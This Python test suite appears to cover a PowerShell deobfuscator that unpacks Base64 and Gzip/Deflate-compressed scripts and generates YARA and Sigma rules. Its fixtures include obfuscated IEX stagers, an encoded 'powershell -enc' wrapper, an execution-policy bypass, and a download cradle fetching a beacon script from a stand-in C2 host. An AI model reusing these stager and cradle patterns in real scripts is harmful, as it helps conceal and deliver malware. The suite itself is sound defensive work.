"""
Comprehensive unit and integration test suite for in-memory compressed stream deobfuscation.
Verifies GzipStream, DeflateStream, BrotliStream, MemoryStream, StreamReader,
multi-encoding detection, AST reduction, fixed-point convergence, telemetry, and CLI flags.
"""

import base64
import gzip
import io
import json
import os
import tempfile
import unittest
from unittest.mock import patch
import zlib

from src.ast_nodes import ScriptBlockNode, StringLiteralNode
from src.cli import main
from src.compression import (
    CompressionType,
    DecompressedStreamLayer,
    PowerShellCompressionReducer,
    StreamDecompressionResult,
    StreamEncoding,
    calculate_entropy,
    decode_stream_bytes,
    decompress_stream_bytes,
    decompress_stream_payload,
    extract_raw_byte_array,
    parse_base64_stream,
)
from src.deobfuscator_engine import PowerShellDeobfuscator
from src.lexer import PowerShellLexer
from src.parser import PowerShellParser
from src.secure_string_crypto import zeroize_buffer


def _make_gzip_b64(text: str, encoding: str = "utf-8") -> str:
    raw = text.encode(encoding)
    compressed = gzip.compress(raw)
    return base64.b64encode(compressed).decode("ascii")


def _make_deflate_raw_b64(text: str, encoding: str = "utf-8") -> str:
    raw = text.encode(encoding)
    compressed = zlib.compress(raw)[2:-4]  # strip RFC 1950 header and Adler32 checksum
    return base64.b64encode(compressed).decode("ascii")


def _make_deflate_zlib_b64(text: str, encoding: str = "utf-8") -> str:
    raw = text.encode(encoding)
    compressed = zlib.compress(raw)
    return base64.b64encode(compressed).decode("ascii")


class TestStreamDecompressorCore(unittest.TestCase):
    """Verifies low-level stream byte decompression, format auto-detection, and decoding."""

    def test_gzip_raw_bytes_decompression(self):
        original = b"Write-Output 'Decompressed from GzipStream'"
        compressed = gzip.compress(original)
        decompressed, comp_type = decompress_stream_bytes(compressed)
        self.assertEqual(decompressed, original)
        self.assertEqual(comp_type, CompressionType.GZIP)

    def test_deflate_raw_bytes_decompression(self):
        original = b"Get-Process -Name powershell"
        # RFC 1951 raw deflate as output by .NET DeflateStream
        compressed = zlib.compress(original)[2:-4]
        decompressed, comp_type = decompress_stream_bytes(compressed, CompressionType.DEFLATE)
        self.assertEqual(decompressed, original)
        self.assertEqual(comp_type, CompressionType.DEFLATE)

    def test_deflate_zlib_bytes_decompression(self):
        original = b"Start-Service -Name W32Time"
        compressed = zlib.compress(original)
        decompressed, comp_type = decompress_stream_bytes(compressed)
        self.assertEqual(decompressed, original)
        self.assertEqual(comp_type, CompressionType.DEFLATE)

    def test_empty_and_invalid_bytes_handling(self):
        decomp, comp_type = decompress_stream_bytes(b"")
        self.assertIsNone(decomp)
        self.assertEqual(comp_type, CompressionType.UNKNOWN)

        decomp_corrupt, comp_type_corrupt = decompress_stream_bytes(b"corrupted_non_compressed_data")
        self.assertIsNone(decomp_corrupt)
        self.assertEqual(comp_type_corrupt, CompressionType.UNKNOWN)

    def test_decode_stream_bytes_utf8(self):
        text = "Write-Host 'Hello UTF-8 World'"
        raw = text.encode("utf-8")
        decoded, enc = decode_stream_bytes(raw)
        self.assertEqual(decoded, text)
        self.assertEqual(enc, "utf-8")

        # UTF-8 with BOM
        bom_raw = b"\xef\xbb\xbf" + raw
        decoded_bom, enc_bom = decode_stream_bytes(bom_raw)
        self.assertEqual(decoded_bom, text)
        self.assertEqual(enc_bom, "utf-8-bom")

    def test_decode_stream_bytes_utf16le(self):
        text = "Invoke-Expression 'Get-Host'"
        raw = text.encode("utf-16le")
        decoded, enc = decode_stream_bytes(raw)
        self.assertEqual(decoded, text)
        self.assertEqual(enc, "utf-16le")

        # UTF-16LE with BOM
        bom_raw = b"\xff\xfe" + raw
        decoded_bom, enc_bom = decode_stream_bytes(bom_raw)
        self.assertEqual(decoded_bom, text)
        self.assertEqual(enc_bom, "utf-16le-bom")

    def test_decode_stream_bytes_encoding_hints(self):
        text = "whoami /all"
        raw = text.encode("ascii")
        decoded, enc = decode_stream_bytes(raw, encoding_hint="ascii")
        self.assertEqual(decoded, text)
        self.assertEqual(enc, "ascii")

    def test_parse_base64_stream(self):
        payload = "H4sICDYX..."
        # Padded string
        orig_bytes = b"Test Payload Bytes"
        b64 = base64.b64encode(orig_bytes).decode("ascii")
        self.assertEqual(parse_base64_stream(b64), orig_bytes)

        # Base64 with surrounding quotes and backticks
        obf_b64 = f" '`{b64[:4]}`{b64[4:]}' "
        self.assertEqual(parse_base64_stream(obf_b64), orig_bytes)

        # Base64 with unpadded length
        unpadded = b64.rstrip("=")
        self.assertEqual(parse_base64_stream(unpadded), orig_bytes)

    def test_calculate_entropy(self):
        plain = "AAAAAA"
        compressed = gzip.compress(b"Super random high entropy compressed payload string 1234567890")
        entropy_plain = calculate_entropy(plain)
        entropy_comp = calculate_entropy(compressed)
        self.assertLess(entropy_plain, 1.0)
        self.assertGreater(entropy_comp, 3.5)

    def test_decompress_stream_payload_helper(self):
        secret = "Invoke-Item 'C:\\Windows\\System32\\calc.exe'"
        b64 = _make_gzip_b64(secret)
        res = decompress_stream_payload(b64)
        self.assertIsNotNone(res)
        text, comp_type = res
        self.assertEqual(text, secret)
        self.assertEqual(comp_type, CompressionType.GZIP)


class TestStreamDecompressorAST(unittest.TestCase):
    """Verifies AST visitor patterns, StreamReader unboxing, and multi-statement reduction."""

    def test_gzipstream_oneliner_ast_reduction(self):
        payload_code = "Invoke-Expression 'Get-Service'"
        b64 = _make_gzip_b64(payload_code)
        script = (
            f"(New-Object System.IO.StreamReader("
            f"New-Object System.IO.Compression.GZipStream("
            f"New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('{b64}')), "
            f"[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        # The ReadToEnd() call should reduce to a single StringLiteralNode
        self.assertIsInstance(norm_ast, ScriptBlockNode)
        self.assertEqual(len(norm_ast.statements), 1)
        stmt = norm_ast.statements[0]
        self.assertIsInstance(stmt, StringLiteralNode)
        self.assertEqual(stmt.value, payload_code)
        self.assertEqual(len(reducer.last_layers), 1)
        self.assertEqual(reducer.last_layers[0].compression_type, CompressionType.GZIP)

    def test_deflatestream_oneliner_ast_reduction(self):
        payload_code = "Write-Host 'Deflate Stream Works'"
        b64 = _make_deflate_raw_b64(payload_code)
        script = (
            f"(New-Object IO.StreamReader("
            f"New-Object IO.Compression.DeflateStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')), "
            f"[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        self.assertIsInstance(norm_ast, ScriptBlockNode)
        stmt = norm_ast.statements[0]
        self.assertIsInstance(stmt, StringLiteralNode)
        self.assertEqual(stmt.value, payload_code)
        self.assertEqual(len(reducer.last_layers), 1)
        self.assertEqual(reducer.last_layers[0].compression_type, CompressionType.DEFLATE)

    def test_static_constructor_new_reduction(self):
        payload_code = "Get-ChildItem -Recurse"
        b64 = _make_gzip_b64(payload_code)
        script = (
            f"[IO.StreamReader]::new("
            f"[IO.Compression.GZipStream]::new("
            f"[IO.MemoryStream]::new([Convert]::FromBase64String('{b64}')), "
            f"[IO.Compression.CompressionMode]::Decompress)).ReadToEnd()"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        self.assertIsInstance(norm_ast, ScriptBlockNode)
        stmt = norm_ast.statements[0]
        self.assertIsInstance(stmt, StringLiteralNode)
        self.assertEqual(stmt.value, payload_code)

    def test_multistep_variable_assignment_reduction(self):
        payload_code = "Stop-Process -Name svchost -Force"
        b64 = _make_gzip_b64(payload_code)
        script = (
            f"$data = '{b64}';\n"
            f"$bytes = [System.Convert]::FromBase64String($data);\n"
            f"$ms = New-Object System.IO.MemoryStream(,$bytes);\n"
            f"$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress);\n"
            f"$sr = New-Object System.IO.StreamReader($gz);\n"
            f"$payload = $sr.ReadToEnd()"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        self.assertIsInstance(norm_ast, ScriptBlockNode)
        # Verify that the last assignment $payload = $sr.ReadToEnd() has value reduced to StringLiteralNode
        last_stmt = norm_ast.statements[-1]
        self.assertEqual(last_stmt.variable.name, "payload")
        self.assertIsInstance(last_stmt.expression, StringLiteralNode)
        self.assertEqual(last_stmt.expression.value, payload_code)

    def test_copyto_memorystream_reduction(self):
        payload_code = "Write-Output 'Decompressed via CopyTo'"
        b64 = _make_gzip_b64(payload_code)
        script = (
            f"$bytes = [Convert]::FromBase64String('{b64}');\n"
            f"$ms = New-Object IO.MemoryStream(,$bytes);\n"
            f"$gz = New-Object IO.Compression.GZipStream($ms, 1);\n"
            f"$out = New-Object IO.MemoryStream;\n"
            f"$gz.CopyTo($out);\n"
            f"$res = [System.Text.Encoding]::UTF8.GetString($out.ToArray())"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        last_stmt = norm_ast.statements[-1]
        self.assertEqual(last_stmt.variable.name, "res")
        self.assertIsInstance(last_stmt.expression, StringLiteralNode)
        self.assertEqual(last_stmt.expression.value, payload_code)

    def test_numeric_compression_mode_1_reduction(self):
        # 1 represents CompressionMode.Decompress in .NET
        payload_code = "Set-ExecutionPolicy -Scope Process Bypass"
        b64 = _make_deflate_raw_b64(payload_code)
        script = (
            f"(New-Object IO.StreamReader("
            f"New-Object IO.Compression.DeflateStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')), 1))).ReadToEnd()"
        )

        tokens = PowerShellLexer(script).tokenize()
        parser = PowerShellParser(tokens)
        ast = parser.parse()

        reducer = PowerShellCompressionReducer()
        norm_ast = reducer.reduce(ast)

        stmt = norm_ast.statements[0]
        self.assertIsInstance(stmt, StringLiteralNode)
        self.assertEqual(stmt.value, payload_code)


class TestStreamDecompressorEngineIntegration(unittest.TestCase):
    """Verifies end-to-end integration into PowerShellDeobfuscator, IEX peeling, and CLI."""

    def test_iex_wrapping_compressed_stream(self):
        inner_command = "Start-Process 'cmd.exe' -ArgumentList '/c calc'"
        b64 = _make_gzip_b64(inner_command)
        script = (
            f"IEX (New-Object System.IO.StreamReader("
            f"New-Object System.IO.Compression.GZipStream("
            f"New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('{b64}')), "
            f"[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )

        deobfuscator = PowerShellDeobfuscator()
        result = deobfuscator.deobfuscate(script)

        # After stream decompression and IEX unboxing, it should yield the command directly
        self.assertEqual(result, inner_command)
        self.assertGreaterEqual(len(deobfuscator.last_compression_layers), 1)

    def test_nested_base64_and_compression_convergence(self):
        inner_code = "Get-Process -Name explorer"
        gz_b64 = _make_gzip_b64(inner_code)
        # Encapsulate in a powershell -enc wrapper
        stager_code = (
            f"(New-Object IO.StreamReader("
            f"New-Object IO.Compression.GZipStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{gz_b64}')), 1))).ReadToEnd()"
        )
        outer_b64 = base64.b64encode(stager_code.encode("utf-16le")).decode("ascii")
        full_command = f"powershell.exe -NoProfile -enc {outer_b64}"

        deobfuscator = PowerShellDeobfuscator()
        result = deobfuscator.deobfuscate(full_command)

        # Should unwrap outer Base64 layer, then decompress inner GZip stream
        self.assertIn("Get-Process", result)
        self.assertIn("explorer", result)

    def test_text_regex_fallback_unwrap(self):
        payload_code = "Invoke-Expression 'whoami /priv'"
        b64 = _make_deflate_raw_b64(payload_code)
        script = (
            f"Write-Host 'Preamble'; "
            f"$payload = (New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream(New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('{b64}')), [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); "
            f"Write-Host 'Epilogue'"
        )

        reducer = PowerShellCompressionReducer()
        res = reducer.unwrap_text(script)
        self.assertTrue(res.has_decompressed_streams)
        self.assertIn("whoami /priv", res.unwrapped_script)
        self.assertEqual(len(res.layers), 1)

    def test_cli_trace_streams(self):
        payload = "Write-Output 'CLI Stream Telemetry Test'"
        b64 = _make_gzip_b64(payload)
        script = (
            f"(New-Object IO.StreamReader("
            f"New-Object IO.Compression.GZipStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')), 1))).ReadToEnd()"
        )

        with patch("sys.argv", ["powershell-ast-deobfuscator", script, "--trace-streams"]):
            with patch("sys.stdout", new_callable=io.StringIO) as mock_stdout:
                main()
                output = mock_stdout.getvalue()

        data = json.loads(output)
        self.assertTrue(data.get("has_compressed_streams"))
        self.assertEqual(data.get("total_layers"), 1)
        layers = data.get("layers", [])
        self.assertEqual(len(layers), 1)
        self.assertEqual(layers[0]["compression_type"], "gzip")
        self.assertEqual(layers[0]["decompressed_text"], payload)

    def test_cli_no_decompress_streams_flag(self):
        payload = "Write-Output 'Should remain compressed'"
        b64 = _make_gzip_b64(payload)
        script = (
            f"(New-Object IO.StreamReader("
            f"New-Object IO.Compression.GZipStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')), 1))).ReadToEnd()"
        )

        with patch("sys.argv", ["powershell-ast-deobfuscator", script, "--no-decompress-streams"]):
            with patch("sys.stdout", new_callable=io.StringIO) as mock_stdout:
                main()
                output = mock_stdout.getvalue().strip()

        # When --no-decompress-streams is passed, the stream reader call is preserved without decompression
        self.assertIn("GZipStream", output)

    def test_threat_rule_generator_with_compressed_payload(self):
        # A compressed stream concealing a C2 URL and memory allocation API
        concealed_payload = (
            "$wc = New-Object Net.WebClient; "
            "$wc.DownloadString('http://c2.threat-compressed.org/beacon.ps1'); "
            "[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 100)"
        )
        b64 = _make_gzip_b64(concealed_payload)
        script = (
            f"$code = (New-Object IO.StreamReader("
            f"New-Object IO.Compression.GZipStream("
            f"New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')), 1))).ReadToEnd(); "
            f"IEX $code"
        )

        engine = PowerShellDeobfuscator()
        yara_rule = engine.generate_yara_rule(script)
        sigma_rule = engine.generate_sigma_rule(script)

        # The C2 URL was inside the GzipStream, but should now be revealed and present in the YARA/Sigma rule
        self.assertIn("c2.threat-compressed.org", yara_rule)
        self.assertIn("c2.threat-compressed.org", sigma_rule)


if __name__ == "__main__":
    unittest.main()
